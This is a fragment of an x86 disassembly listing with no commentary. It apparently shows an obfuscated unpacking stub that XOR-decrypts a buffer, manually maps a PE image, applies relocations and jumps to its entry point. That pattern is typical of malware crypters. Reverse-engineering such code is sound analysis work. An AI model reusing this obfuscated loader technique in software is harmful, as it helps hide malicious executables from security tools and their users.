  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
